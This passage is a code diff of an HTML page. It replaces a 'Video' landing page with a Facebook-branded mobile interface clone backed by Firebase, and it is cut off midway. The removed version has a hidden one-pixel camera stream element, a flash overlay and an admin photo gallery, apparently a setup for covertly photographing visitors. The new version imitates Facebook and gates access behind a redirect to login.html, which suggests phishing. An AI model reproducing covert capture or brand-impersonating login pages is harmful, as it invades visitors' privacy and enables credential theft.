@@ -2,358 +2,2072 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video</title>
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook Mobile UI - Firebase</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- Firebase SDKs (শুধু App এবং Firestore লাগবে) -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        :root {
-            --bg: #0a0a0f;
-            --card: #14141f;
-            --accent: #ff4d4d;
-            --accent-glow: rgba(255, 77, 77, 0.3);
-            --text: #e8e8ef;
-            --muted: #7a7a8e;
-            --border: #2a2a3a;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            font-family: 'Noto Sans Bengali', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            min-height: 100vh;
+            background-color: #f0f2f5;
+            color: #050505;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
+            overflow-x: hidden;
+        }
+
+        .fb-container {
+            width: 100%;
+            max-width: 500px;
+            background-color: #ffffff;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        .click-effect {
+            position: relative;
+            overflow: hidden;
+            transition: opacity 0.15s ease, transform 0.1s ease;
+            cursor: pointer;
+        }
+
+        .click-effect:active {
+            opacity: 0.7;
+            transform: scale(0.97);
+        }
+
+        .swipe-refresh-indicator {
+            position: absolute;
+            top: 100px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-50px);
+            width: 40px;
+            height: 40px;
+            background: #ffffff;
+            border-radius: 50%;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+            display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
+            z-index: 1000;
+            opacity: 0;
+            transition: transform 0.1s ease, opacity 0.1s ease;
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            top: -50%; left: -50%;
-            width: 200%; height: 200%;
-            background: radial-gradient(ellipse at 30% 20%, rgba(255, 77, 77, 0.06) 0%, transparent 50%),
-                        radial-gradient(ellipse at 70% 80%, rgba(77, 77, 255, 0.04) 0%, transparent 50%);
-            z-index: 0;
+        .swipe-refresh-indicator i {
+            color: #1877f2;
+            font-size: 18px;
+            transition: transform 0.2s ease;
         }
 
-        .container {
-            position: relative;
-            z-index: 1;
-            width: 100%;
-            max-width: 560px;
-            padding: 20px;
+        .swipe-refresh-indicator.spinning i {
+            animation: spinRefresh 0.8s infinite linear;
         }
 
-        .page-title { text-align: center; margin-bottom: 28px; }
-        .page-title h1 { font-size: 1.8rem; font-weight: 700; margin-bottom: 8px; }
-        .page-title p { color: var(--muted); font-size: 0.95rem; }
-
-        .video-card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.4);
+        @keyframes spinRefresh {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .video-wrapper {
-            position: relative;
-            width: 100%;
-            aspect-ratio: 16 / 9;
-            background: #000;
+        .fb-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            background: #ffffff;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .fb-logo {
+            color: #1877f2;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -1px;
             cursor: pointer;
+            text-decoration: none;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 8px;
+        }
+
+        .icon-btn {
+            width: 36px;
+            height: 36px;
+            background-color: #e4e6eb;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: #050505;
+            cursor: pointer;
+            border: none;
+            text-decoration: none;
+        }
+
+        .fb-nav-tabs {
+            display: flex;
+            justify-content: space-around;
+            border-bottom: 1px solid #ced0d4;
+            background: #ffffff;
+            position: sticky;
+            top: 56px;
+            z-index: 99;
+        }
+
+        .nav-tab {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 48px;
+            font-size: 20px;
+            color: #65676b;
+            position: relative;
+            cursor: pointer;
+            border: none;
+            background: none;
+            text-decoration: none;
+        }
+
+        .nav-tab.active {
+            color: #1877f2;
+            border-bottom: 3px solid #1877f2;
+        }
+
+        .nav-tab .badge {
+            position: absolute;
+            top: 6px;
+            right: 22%;
+            background-color: #e41e3f;
+            color: white;
+            font-size: 10px;
+            padding: 1px 4px;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+
+        .view-section {
+            display: none;
+        }
+
+        .view-section.active-view {
+            display: block;
+        }
+
+        .create-post-section {
+            display: flex;
+            align-items: center;
+            padding: 10px 12px;
+            background: #ffffff;
+            border-bottom: 8px solid #f0f2f5;
+            gap: 10px;
+        }
+
+        .profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+            cursor: pointer;
+        }
+
+        .post-input-box {
+            flex: 1;
+            border: 1px solid #ccd0d5;
+            border-radius: 20px;
+            padding: 9px 15px;
+            color: #65676b;
+            font-size: 15px;
+            background: #ffffff;
+            text-align: left;
+            cursor: pointer;
+            user-select: none;
+            text-decoration: none;
+            display: block;
+        }
+
+        .photo-icon-btn {
+            color: #45bd62;
+            font-size: 22px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .stories-container {
+            display: flex;
+            gap: 8px;
+            padding: 12px;
+            background: #f0f2f5;
+            overflow-x: auto;
+            border-bottom: 8px solid #f0f2f5;
+            scrollbar-width: none;
+        }
+
+        .stories-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        .story-card {
+            min-width: 110px;
+            height: 190px;
+            border-radius: 12px;
+            position: relative;
             overflow: hidden;
+            background: #ffffff;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            cursor: pointer;
+            flex-shrink: 0;
+            text-decoration: none;
+            display: block;
         }
 
-        .video-wrapper video { width: 100%; height: 100%; object-fit: cover; display: block; }
-
-        .play-overlay {
-            position: absolute; inset: 0;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            background: rgba(0, 0, 0, 0.45);
-            transition: background 0.3s;
+        .story-card.create-story {
+            border: 1px solid #e4e6eb;
+            display: flex;
+            flex-direction: column;
         }
-        .play-overlay:hover { background: rgba(0, 0, 0, 0.3); }
 
-        .play-btn {
-            width: 72px; height: 72px; border-radius: 50%; background: var(--accent);
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 0 30px var(--accent-glow); transition: transform 0.25s;
+        .create-story-top {
+            height: 70%;
+            position: relative;
+            background: #fff;
         }
-        .play-overlay:hover .play-btn { transform: scale(1.1); }
-        .play-btn svg { width: 28px; height: 28px; margin-left: 3px; }
-        .play-label { margin-top: 12px; font-size: 0.85rem; color: rgba(255,255,255,0.7); }
-        .play-overlay.hidden { display: none; }
 
-        #cameraStream { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-
-        .flash {
-            position: fixed; inset: 0; background: #fff; opacity: 0;
-            pointer-events: none; z-index: 999; transition: opacity 0.15s;
+        .create-story-top img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
-        .flash.active { opacity: 0.8; }
 
-        .video-info {
-            padding: 16px 20px;
-            display: flex; align-items: center; justify-content: space-between;
+        .add-story-icon-wrap {
+            position: absolute;
+            bottom: -16px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 32px;
+            height: 32px;
+            background: #1877f2;
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
         }
-        .video-info .title { font-size: 0.95rem; font-weight: 700; }
-        .video-info .duration { font-size: 0.8rem; color: var(--muted); background: rgba(255,255,255,0.06); padding: 4px 10px; border-radius: 20px; }
 
-        .toast {
-            position: fixed; bottom: 30px; left: 50%;
-            transform: translateX(-50%) translateY(80px);
-            background: var(--card); border: 1px solid var(--border); color: var(--text);
-            padding: 12px 24px; border-radius: 12px; font-size: 0.88rem;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.5); opacity: 0;
-            transition: all 0.4s ease; z-index: 1000; text-align: center; max-width: 90%;
+        .create-story-bottom {
+            height: 30%;
+            background: #ffffff;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            padding-bottom: 10px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #050505;
+            text-align: center;
         }
-        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-        .toast.error { border-color: var(--accent); }
-        .toast.success { border-color: #22c55e; }
 
-        .footer-note { text-align: center; margin-top: 24px; font-size: 0.78rem; color: var(--muted); }
+        .story-card img.story-bg {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
 
-        /* Admin Panel Styles */
-        #adminSection { display: none; width: 100%; max-width: 800px; padding: 20px; z-index: 1; }
-        #adminSection.active { display: block; }
-        .admin-header { text-align: center; margin-bottom: 30px; }
-        .admin-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
-        .photo-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
-        .photo-card img { width: 100%; aspect-ratio: 1; object-fit: cover; }
-        .photo-card .meta { padding: 10px; font-size: 0.8rem; color: var(--muted); }
+        .story-card .story-badge-num {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: #1877f2;
+            color: white;
+            font-size: 11px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: bold;
+            z-index: 2;
+        }
+
+        .story-card .story-name {
+            position: absolute;
+            bottom: 8px;
+            left: 8px;
+            right: 8px;
+            color: white;
+            font-size: 12px;
+            font-weight: 600;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+            line-height: 1.2;
+            z-index: 2;
+        }
+
+        .post-container {
+            background: #ffffff;
+            margin-bottom: 10px;
+            border-bottom: 8px solid #f0f2f5;
+            cursor: pointer;
+        }
+
+        .post-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 12px;
+        }
+
+        .post-user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .post-avatar-wrap {
+            position: relative;
+        }
+
+        .online-dot {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 10px;
+            height: 10px;
+            background-color: #31a24c;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+        }
+
+        .post-author-details h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #050505;
+            cursor: pointer;
+        }
+        .post-author-details h4:hover {
+            text-decoration: underline;
+        }
+
+        .post-time-privacy {
+            font-size: 12px;
+            color: #65676b;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 1px;
+        }
+
+        .post-actions-right {
+            display: flex;
+            gap: 12px;
+            color: #65676b;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .post-caption {
+            padding: 0 12px 10px 12px;
+            font-size: 15px;
+            color: #050505;
+            line-height: 1.4;
+        }
+
+        .post-media-content {
+            width: 100%;
+            border-top: 1px solid #f0f2f5;
+            border-bottom: 1px solid #f0f2f5;
+            background: #000000;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+            position: relative;
+        }
+
+        .post-media-content img, 
+        .post-media-content video {
+            width: 100%;
+            height: auto;
+            max-height: 450px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .post-stats {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 12px;
+            font-size: 13px;
+            color: #65676b;
+            border-bottom: 1px solid #f0f2f5;
+            user-select: none;
+        }
+
+        .post-stats-left {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .post-stat-icons {
+            display: inline-flex;
+            gap: 2px;
+        }
+
+        .post-action-buttons {
+            display: flex;
+            justify-content: space-around;
+            padding: 4px 0;
+            border-bottom: 1px solid #f0f2f5;
+            position: relative;
+        }
+
+        .action-btn {
+            flex: 1;
+            background: none;
+            border: none;
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #65676b;
+            cursor: pointer;
+            text-decoration: none;
+            user-select: none;
+            transition: background 0.2s;
+            position: relative;
+        }
+
+        .action-btn:active {
+            background-color: #f0f2f5;
+        }
+
+        .action-btn.liked {
+            color: #1877f2;
+        }
+
+        .reaction-popup {
+            position: absolute;
+            bottom: 45px;
+            left: 10px;
+            background: #ffffff;
+            border-radius: 35px;
+            padding: 6px 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+            display: flex;
+            gap: 8px;
+            z-index: 500;
+            opacity: 0;
+            transform: scale(0.5) translateY(10px);
+            pointer-events: none;
+            transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .reaction-popup.show {
+            opacity: 1;
+            transform: scale(1) translateY(0);
+            pointer-events: auto;
+        }
+
+        .reaction-icon {
+            font-size: 28px;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+            display: inline-block;
+        }
+
+        .reaction-icon:hover {
+            transform: scale(1.4) translateY(-8px);
+        }
+
+        .pymk-container {
+            background: #ffffff;
+            margin-bottom: 10px;
+            border-bottom: 8px solid #f0f2f5;
+            padding: 12px 0 16px 0;
+        }
+
+        .pymk-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 12px 10px 12px;
+        }
+
+        .pymk-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #050505;
+        }
+
+        .pymk-cards-scroll {
+            display: flex;
+            gap: 8px;
+            padding: 0 12px;
+            overflow-x: auto;
+            scrollbar-width: none;
+        }
+
+        .pymk-cards-scroll::-webkit-scrollbar {
+            display: none;
+        }
+
+        .pymk-card {
+            min-width: 160px;
+            max-width: 160px;
+            background: #ffffff;
+            border: 1px solid #ced0d4;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+        }
+
+        .pymk-img-wrap {
+            width: 100%;
+            height: 160px;
+            background: #e4e6eb;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .pymk-img-wrap img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .pymk-info {
+            padding: 10px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .pymk-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #050505;
+            margin-bottom: 10px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            cursor: pointer;
+        }
+        .pymk-name:hover {
+            text-decoration: underline;
+        }
+
+        .pymk-add-btn {
+            width: 100%;
+            background-color: #e7f3ff;
+            color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 0;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .pymk-add-btn:active {
+            background-color: #dbe7f2;
+        }
+
+        .pymk-see-all-btn {
+            margin: 12px 12px 0 12px;
+            width: calc(100% - 24px);
+            background-color: #e4e6eb;
+            color: #050505;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 0;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+        }
+
+        .pymk-see-all-btn:active {
+            background-color: #d8dadf;
+        }
+
+        .animated-ad-box {
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(135deg, #1877f2, #00c6ff);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: block;
+        }
+
+        .animated-ad-content h2 {
+            font-size: 24px;
+            margin-bottom: 8px;
+            animation: bounceIn 1.5s infinite alternate;
+        }
+
+        @keyframes bounceIn {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-5px); }
+        }
+
+        .menu-view {
+            background-color: #f0f2f5;
+            min-height: calc(100vh - 104px);
+            padding: 10px 12px 30px 12px;
+        }
+
+        .menu-top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 5px 0 12px 0;
+        }
+
+        .menu-title-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .menu-back-btn {
+            font-size: 20px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #050505;
+        }
+
+        .menu-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #050505;
+        }
+
+        .menu-top-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .menu-card {
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 10px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .profile-card-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .menu-profile-pic {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .menu-profile-info h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #050505;
+        }
+
+        .menu-profile-info p {
+            font-size: 13px;
+            color: #65676b;
+        }
+
+        .profile-card-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .mini-avatar-stack {
+            position: relative;
+            width: 32px;
+            height: 32px;
+        }
+
+        .mini-avatar-stack img {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            position: absolute;
+            border: 2px solid #fff;
+            object-fit: cover;
+        }
+
+        .mini-avatar-stack img:nth-child(1) {
+            top: 0;
+            left: 0;
+            z-index: 2;
+        }
+        .mini-avatar-stack img:nth-child(2) {
+            bottom: 0;
+            right: 0;
+            z-index: 1;
+        }
+
+        .dropdown-circle-btn {
+            width: 30px;
+            height: 30px;
+            background-color: #e4e6eb;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            color: #050505;
+        }
+
+        .invite-friends-card {
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 14px 12px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 600;
+            color: #050505;
+            text-decoration: none;
+        }
+
+        .invite-heart-icon {
+            color: #ff3040;
+            font-size: 18px;
+        }
+
+        .shortcuts-heading {
+            font-size: 15px;
+            font-weight: 600;
+            color: #65676b;
+            margin-bottom: 8px;
+        }
+
+        .shortcuts-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+        }
+
+        .shortcut-item {
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 14px 12px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            cursor: pointer;
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .shortcut-icon {
+            font-size: 24px;
+        }
+
+        .shortcut-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: #050505;
+        }
+
+        .post-banner {
+            padding: 20px 16px;
+            min-height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 8px 8px 8px;
+            border-radius: 8px;
+        }
+
+        .post-banner .post-caption {
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: bold;
+            text-align: center;
+            padding: 0;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+
+        .theme-white .post-banner { display: none; }
+        .theme-purple .post-banner { background: linear-gradient(135deg, #8A2387, #E94057, #F27121); }
+        .theme-red .post-banner { background: linear-gradient(135deg, #CB356B, #BD3F32); }
+        .theme-dark .post-banner { background: #242526; }
+        .theme-sunset .post-banner { background: linear-gradient(135deg, #ff7e5f, #feb47b); }
+
+        .no-posts-message {
+            text-align: center;
+            padding: 40px 20px;
+            color: #65676b;
+            font-size: 16px;
+        }
+
+        .no-posts-message i {
+            font-size: 48px;
+            color: #ced0d4;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .feed-loader {
+            text-align: center;
+            padding: 30px;
+            color: #65676b;
+        }
+        .feed-loader i {
+            font-size: 28px;
+            animation: spinRefresh 1s infinite linear;
+        }
+
+        .feed-scroll-pos {
+            display: none;
+        }
+
+        .infinite-scroll-trigger {
+            height: 20px;
+            text-align: center;
+            padding: 20px 0;
+            color: #65676b;
+            font-size: 14px;
+        }
+
+        .infinite-scroll-trigger .loader-spinner {
+            display: inline-block;
+            animation: spinRefresh 1s infinite linear;
+            margin-right: 8px;
+        }
+
+        .comment-item {
+            display: flex;
+            gap: 10px;
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f2f5;
+            cursor: pointer;
+        }
+
+        .comment-item img {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .comment-item .comment-body {
+            flex: 1;
+        }
+
+        .comment-item .comment-body .comment-author {
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .comment-item .comment-body .comment-text {
+            font-size: 14px;
+            color: #050505;
+        }
+
+        .comment-item .comment-body .comment-time {
+            font-size: 11px;
+            color: #65676b;
+        }
+
+        .loading-shimmer {
+            background: #f0f2f5;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 10px;
+            animation: shimmerPulse 1.5s infinite;
+        }
+
+        @keyframes shimmerPulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .loading-shimmer .line {
+            height: 12px;
+            background: #e4e6eb;
+            margin: 6px 0;
+            border-radius: 4px;
+        }
+
+        .loading-shimmer .line.short { width: 60%; }
+        .loading-shimmer .line.medium { width: 80%; }
     </style>
 </head>
 <body>
 
-    <!-- User Video Section -->
-    <div class="container" id="userSection">
-        <div class="page-title">
-            <h1>ভিডিও দেখুন</h1>
+    <script>
+        // --- LOGIN CHECK ON LOAD ---
+        (function checkLoginState() {
+            const isLoggedIn = localStorage.getItem('isLoggedIn');
+            if (!isLoggedIn || isLoggedIn !== 'true') {
+                window.location.replace('login.html');
+            }
+        })();
+
+        // --- PAGE STATE MANAGEMENT ---
+        const pageState = {
+            current: 'home',
+            scrollPositions: {},
+            feedItems: [],
+            displayedCount: 0,
+            batchSize: 10,
+            isLoadingMore: false,
+            allLoaded: false
+        };
+    </script>
+
+    <div class="fb-container" id="fbContainer">
+        <div class="swipe-refresh-indicator" id="refreshIndicator">
+            <i class="fa-solid fa-arrows-rotate"></i>
         </div>
-        <div class="video-card">
-            <div class="video-wrapper" id="videoWrapper">
-                <video id="mainVideo" playsinline preload="metadata" poster="https://picsum.photos/seed/vidlanding/640/360.jpg">
-                    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-                </video>
-                <div class="play-overlay" id="playOverlay">
-                    <div class="play-btn">
-                        <svg viewBox="0 0 24 24" fill="white"><polygon points="6,3 20,12 6,21"/></svg>
+
+        <div class="fb-header">
+            <a href="#" class="fb-logo click-effect" onclick="navigateTo('home')">facebook</a>
+            <div class="header-icons">
+                <a href="#" class="icon-btn click-effect" onclick="navigateTo('create-post')"><i class="fa-solid fa-plus"></i></a>
+                <a href="#" class="icon-btn click-effect" onclick="navigateTo('search')"><i class="fa-solid fa-magnifying-glass"></i></a>
+                <button class="icon-btn click-effect" onclick="toggleMenu()"><i class="fa-solid fa-bars"></i></button>
+            </div>
+        </div>
+
+        <div class="fb-nav-tabs">
+            <button class="nav-tab active click-effect" onclick="switchView('home')">
+                <i class="fa-solid fa-house"></i>
+                <span class="badge">15+</span>
+            </button>
+            <a href="#" class="nav-tab click-effect" onclick="navigateTo('friends')">
+                <i class="fa-solid fa-user-group"></i>
+            </a>
+            <a href="#" class="nav-tab click-effect" onclick="navigateTo('messenger')">
+                <i class="fa-brands fa-facebook-messenger"></i>
+                <span class="badge">15+</span>
+            </a>
+            <a href="#" class="nav-tab click-effect" onclick="navigateTo('watch')">
+                <i class="fa-solid fa-tv"></i>
+            </a>
+            <a href="#" class="nav-tab click-effect" onclick="navigateTo('notifications')">
+                <i class="fa-solid fa-bell"></i>
+            </a>
+            <button class="nav-tab click-effect" onclick="toggleMenu()">
+                <i class="fa-solid fa-bars"></i>
+            </button>
+        </div>
+
+        <!-- HOME VIEW -->
+        <div id="homeView" class="view-section active-view">
+            <div class="create-post-section">
+                <a href="#" class="click-effect" onclick="navigateTo('profile')"><img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=100&q=80" alt="Profile" class="profile-pic"></a>
+                <a href="#" class="post-input-box click-effect" onclick="navigateTo('create-post')">What's on your mind?</a>
+                <a href="#" class="photo-icon-btn click-effect" onclick="navigateTo('create-post')"><i class="fa-solid fa-images"></i></a>
+            </div>
+
+            <div class="stories-container">
+                <a href="#" class="story-card create-story click-effect" onclick="navigateTo('story')">
+                    <div class="create-story-top">
+                        <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=200&q=80" alt="My Profile">
+                        <div class="add-story-icon-wrap">
+                            <i class="fa-solid fa-plus"></i>
+                        </div>
                     </div>
-                    <span class="play-label">ক্লিক করে ভিডিও দেখুন</span>
+                    <div class="create-story-bottom">Create story</div>
+                </a>
+
+                <a href="#" class="story-card click-effect" onclick="navigateTo('story')">
+                    <div class="story-badge-num">1</div>
+                    <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=300&q=80" alt="Tiya Saha" class="story-bg">
+                    <div class="story-name">Tiya Saha</div>
+                </a>
+
+                <a href="#" class="story-card click-effect" onclick="navigateTo('story')">
+                    <div class="story-badge-num">1</div>
+                    <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=300&q=80" alt="Rabby Hasan" class="story-bg">
+                    <div class="story-name">Rabby Hasan</div>
+                </a>
+
+                <a href="#" class="story-card click-effect" onclick="navigateTo('story')">
+                    <div class="story-badge-num">2</div>
+                    <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=300&q=80" alt="Dibos" class="story-bg">
+                    <div class="story-name">Dibos</div>
+                </a>
+            </div>
+
+            <div id="feedPostsContainer">
+                <div class="feed-loader"><i class="fa-solid fa-spinner"></i> Loading feed...</div>
+            </div>
+            <div class="infinite-scroll-trigger" id="scrollTrigger">
+                <span class="loader-spinner" style="display:none;"><i class="fa-solid fa-spinner"></i></span>
+                <span id="loadMoreText">Load more posts</span>
+            </div>
+        </div>
+
+        <!-- MENU VIEW -->
+        <div id="menuView" class="view-section menu-view">
+            <div class="menu-top-bar">
+                <div class="menu-title-area">
+                    <button class="menu-back-btn click-effect" onclick="toggleMenu()"><i class="fa-solid fa-chevron-left"></i></button>
+                    <h1 class="menu-title">Menu</h1>
+                </div>
+                <div class="menu-top-actions">
+                    <a href="#" class="icon-btn click-effect" onclick="navigateTo('settings')"><i class="fa-solid fa-arrow-right-arrow-left" style="font-size: 14px;"></i></a>
+                    <a href="#" class="icon-btn click-effect" onclick="navigateTo('search')"><i class="fa-solid fa-magnifying-glass"></i></a>
                 </div>
             </div>
-            <div class="video-info">
-                <span class="title">Big Buck Bunny</span>
-                <span class="duration">0:10</span>
+
+            <a href="#" class="menu-card click-effect" onclick="navigateTo('profile')">
+                <div class="profile-card-left">
+                    <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=100&q=80" alt="Shopon" class="menu-profile-pic">
+                    <div class="menu-profile-info">
+                        <h4>SHOPON HASAN PRIYO</h4>
+                        <p>View your profile</p>
+                    </div>
+                </div>
+                <div class="profile-card-right">
+                    <div class="dropdown-circle-btn">
+                        <i class="fa-solid fa-arrow-rotate-right" style="font-size: 12px;"></i>
+                    </div>
+                    <div class="dropdown-circle-btn">
+                        <i class="fa-solid fa-chevron-down" style="font-size: 12px;"></i>
+                    </div>
+                </div>
+            </a>
+
+            <a href="#" class="menu-card click-effect" onclick="navigateTo('switch')">
+                <div class="profile-card-left">
+                    <div class="mini-avatar-stack">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=50&q=80" alt="acc1">
+                        <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=50&q=80" alt="acc2">
+                    </div>
+                    <div class="menu-profile-info">
+                        <h4 style="font-weight: 500;">Switch account</h4>
+                    </div>
+                </div>
+                <div class="dropdown-circle-btn">
+                    <i class="fa-solid fa-chevron-down" style="font-size: 12px;"></i>
+                </div>
+            </a>
+
+            <a href="#" class="invite-friends-card click-effect" onclick="navigateTo('invite')">
+                <i class="fa-solid fa-heart invite-heart-icon"></i>
+                <span>Invite friends</span>
+            </a>
+
+            <div class="shortcuts-heading">Your shortcuts</div>
+
+            <div class="shortcuts-grid">
